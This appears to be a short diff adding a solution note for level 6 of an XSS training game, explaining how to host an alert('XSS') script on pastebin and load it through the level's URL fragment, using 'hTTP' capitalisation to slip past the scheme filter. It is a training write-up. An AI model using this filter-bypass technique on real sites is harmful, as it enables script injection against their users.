@@ -1,0 +1,7 @@
+Level6: Follow the white rabbit
+***********************************************************************************
+-open pastebin.com and paste: alert("XSS");
+-Next get the raw link of your XSS file.
+-Now add the link to the vulnerable url and modify the http, so it won't get recognised. 
+
+Solution: http://xss-game.appspot.com/level6/frame#hTTP://pastebin.com/raw/ycjGCXDY
